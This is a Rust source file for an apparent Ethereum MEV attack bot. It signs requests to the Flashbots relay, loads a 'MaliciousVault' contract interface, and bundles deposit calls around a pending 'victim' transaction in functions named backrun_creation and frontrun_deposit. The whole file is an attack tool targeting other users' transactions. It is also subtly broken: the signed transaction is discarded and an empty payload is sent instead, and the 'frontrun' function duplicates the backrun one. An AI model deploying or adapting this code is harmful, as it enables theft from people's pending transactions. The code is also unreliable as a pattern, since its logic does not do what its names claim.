use std::error::Error as StdError;
use ethers::core::{k256::Secp256k1, types::{H256,Bytes as EthBytes}};
use eyre::Result;
use alloy::{
    dyn_abi::DynSolValue, json_abi::JsonAbi, network::{EthereumWallet, NetworkWallet, TransactionBuilder}, primitives::{Address, Bytes, U256}, providers::{Provider, RootProvider}, pubsub::PubSubFrontend, rpc::types::{TransactionInput, TransactionRequest}, signers::local::{LocalSigner, PrivateKeySigner}
};
use alloy_contract::Interface;

use ethers_signers::{LocalWallet, Wallet};
use ecdsa::SigningKey;


use jsonrpsee_http_client::{transport::{Error as HttpError, HttpBackend}, HttpClient, HttpClientBuilder};
use mev_share_rpc_api::{BundleItem, FlashbotsSigner, FlashbotsSignerLayer, SendBundleRequest};
use tower::{util::MapErr, ServiceBuilder};
use std::fs;


use super::helpers::NewPendingTx;
use crate::utils::constants::Env;


pub struct Executor {
    pub vault_interface: Interface,
    pub client: HttpClient<MapErr<FlashbotsSigner<Wallet<SigningKey<Secp256k1>>, HttpBackend>, fn(Box<(dyn StdError + Send + Sync + 'static)>) -> HttpError>>,
}

impl Executor {
    pub fn new() -> Self {
        let env = Env::new();

        let identity = env.identity_key.parse::<LocalWallet>().unwrap();

        // Define the error mapping function
        fn map_err_fn(e: Box<dyn StdError + Send + Sync>) -> HttpError {
            HttpError::Http(e)
        }

        // Set up flashbots-style auth middleware
        let signing_middleware = FlashbotsSignerLayer::new(identity);
        let service_builder = ServiceBuilder::new()
            .map_err(map_err_fn as fn(Box<dyn StdError + Send + Sync>) -> HttpError)
            .layer(signing_middleware);

        // Set up the rpc client
        let url = "https://relay.flashbots.net:443";
        let client = HttpClientBuilder::default()
            .set_middleware(service_builder)
            .build(url)
            .expect("Failed to create http client");

        let vault_interface = {
            let path = "src/data/contract_abis/MaliciousVault.json";
            let json = fs::read_to_string(path).unwrap();
            let abi: JsonAbi = serde_json::from_str(&json).unwrap();
            Interface::new(abi)
        };

        Self {
            vault_interface,
            client,
        }
    }   

    pub async fn backrun_creation(
        &self,
        pending_tx: &mut NewPendingTx,
        vault_address: Address,
        signer: EthereumWallet,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        let call_data = Bytes::copy_from_slice(
            self.vault_interface.encode_input(
                "deposit",
                &[
                        DynSolValue::Uint(U256::from(2_500_000_000u64), 256),
                        DynSolValue::Address(signer.default_signer_address())
                    ]
                )?
            .as_slice());
    
        let backrun_tx = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data)
            .with_max_priority_fee_per_gas(1_000_000_000)
            .with_max_fee_per_gas(20_000_000_000);
    
        let backrun_signed = backrun_tx.build(&signer).await?;
    
        // Convert backrun_signed to Bytes
        let x =  EthBytes::from_static(Bytes::new().as_bytes());
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: x, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.send_bundle(bundle.clone()).await;
        println!("Got a bundle response: {:?}", resp);
    
        // Simulate bundle 
        let sim_res = self.client.sim_bundle(bundle, Default::default()).await;
        println!("Got a simulation response: {:?}", sim_res);
        Ok(())
    }

    pub async fn frontrun_deposit(
        &self,
        pending_tx: &mut NewPendingTx,
        vault_address: Address,
        signer: EthereumWallet,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        let call_data = Bytes::copy_from_slice(
            self.vault_interface.encode_input(
                "deposit",
                &[
                        DynSolValue::Uint(U256::from(2_500_000_000u64), 256),
                        DynSolValue::Address(signer.default_signer_address())
                    ]
                )?
            .as_slice());
    
        let backrun_tx = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data)
            .with_max_priority_fee_per_gas(1_000_000_000)
            .with_max_fee_per_gas(20_000_000_000);
    
        let backrun_signed = backrun_tx.build(&signer).await?;
    
        // Convert backrun_signed to Bytes
        let x =  EthBytes::from_static(Bytes::new().as_bytes());
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: x, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.send_bundle(bundle.clone()).await;
        println!("Got a bundle response: {:?}", resp);
    
        // Simulate bundle 
        let sim_res = self.client.sim_bundle(bundle, Default::default()).await;
        println!("Got a simulation response: {:?}", sim_res);
        Ok(())
    }

}